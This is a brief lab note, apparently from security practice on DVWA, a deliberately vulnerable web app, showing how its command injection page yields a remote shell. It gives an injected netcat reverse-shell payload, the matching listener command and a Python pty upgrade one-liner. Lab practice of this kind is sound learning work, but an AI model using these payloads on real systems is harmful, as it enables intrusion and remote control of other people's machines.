In dvwa, Command injection/execution, 

If We type: & nc <listener ip> <port> -e /bin/bash

we Will get a shell: nc -nlvp <port>

--->

(NOTE: We will not get a interactive shell)

With python: python -c "import pty; pty.spawn('/bin/bash')"


There are many ways you can make your shell interactive if Python is not installed.
